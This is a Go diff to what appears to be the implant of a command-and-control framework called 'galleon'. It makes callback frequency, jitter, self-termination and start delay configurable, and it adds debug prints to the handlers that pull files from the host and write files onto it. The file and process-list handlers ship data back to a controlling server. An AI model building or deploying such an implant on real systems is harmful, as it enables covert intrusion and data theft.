@@ -5,13 +5,18 @@ package agent_helper
 import (
 	"bytes"
 	"compress/gzip"
+	"fmt"
+	"galleon/agent_config"
+	"galleon/debug"
 	"io"
 	"os"
 	"strconv"
 	"strings"
 )
 
-var CallbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20, StartDelay: 5}
+var CallbackTimer = CallbackInfo{Callback_freq: agent_config.CallbackVal,
+	Jitter: agent_config.JitterVal, SelfTerminate: agent_config.SelfTerminateVal,
+	StartDelay: agent_config.StartDelayVal}
 
 func PsHandler(serverUrl string, taskData map[string]interface{}) {
 	processList, err := get_ps()
@@ -21,7 +26,6 @@ func PsHandler(serverUrl string, taskData map[string]interface{}) {
 	}
 	DataShipper(serverUrl, taskData, processList)
 }
-
 
 func ReconfigHandler(serverUrl string, taskData map[string]interface{}) {
 	splitArgs := strings.Split(taskData["args"].(string), " ")
@@ -36,6 +40,9 @@ func DownloadHandler(serverUrl string, taskData map[string]interface{}) {
 	if err != nil {
 		DataShipper(serverUrl, taskData, err.Error())
 		return
+	}
+	if debug.Debug {
+		fmt.Printf("[*] download: %v\n", inFile)
 	}
 	defer inFile.Close()
 	var buf bytes.Buffer
@@ -66,6 +73,9 @@ func UploadHandler(serverUrl string, taskData map[string]interface{}) {
 	if err != nil {
 		DataShipper(serverUrl, taskData, err.Error())
 		return
+	}
+	if debug.Debug {
+		fmt.Printf("[*] upload: src: %v, dst: %v\n", destFile, outputFile)
 	}
 	err = os.WriteFile(destFile, outputFile, os.FileMode(os.O_CREATE|os.O_WRONLY))
 	if err != nil {
